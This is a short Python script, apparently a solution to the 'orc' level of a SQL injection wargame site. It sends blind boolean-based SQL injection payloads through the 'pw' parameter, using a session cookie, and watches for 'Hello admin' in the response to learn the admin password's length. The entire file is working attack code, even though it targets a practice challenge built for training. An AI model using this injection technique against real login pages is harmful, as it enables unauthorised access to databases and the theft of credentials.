import requests

length=0

url ="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?"
cookie = {"PHPSESSID":'YOUR COOKIE VALUE'} #본인의 cookie 값을 코드에 입력

for i in range(0,30):
	query = url+"pw=1' or id='admin' and length(pw)="+str(i)+"%23"
	req = requests.get(query, cookies=cookie)
	print(query)

	if 'Hello admin' in req.text:
		length = i
		break

print ("orc password length : ", length)
